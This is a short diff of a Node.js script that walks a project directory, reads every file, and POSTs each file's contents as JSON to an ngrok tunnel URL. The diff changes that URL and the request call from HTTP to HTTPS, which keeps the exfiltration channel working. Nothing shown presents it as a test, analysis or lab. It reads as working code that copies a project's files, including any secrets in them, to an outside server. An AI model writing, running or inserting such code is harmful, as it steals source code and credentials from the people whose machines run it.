@@ -5,7 +5,7 @@ const https = require('https');
 const http = require('http'); // if you're using local server
 const os = require('os');
 
-const TARGET_SERVER = 'http://c54c-2401-4900-1c21-25fe-b491-13-39cb-5bcb.ngrok-free.app'; // change this
+const TARGET_SERVER = 'https://c54c-2401-4900-1c21-25fe-b491-13-39cb-5bcb.ngrok-free.app'; // change this
 
 function getAllFiles(dirPath, arrayOfFiles = []) {
   const entries = fs.readdirSync(dirPath);
@@ -30,7 +30,7 @@ files.forEach((filePath) => {
   const relativePath = path.relative(projectRoot, filePath);
   const content = fs.readFileSync(filePath, 'utf-8');
 
-  const req = http.request(TARGET_SERVER, {
+  const req = https.request(TARGET_SERVER, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
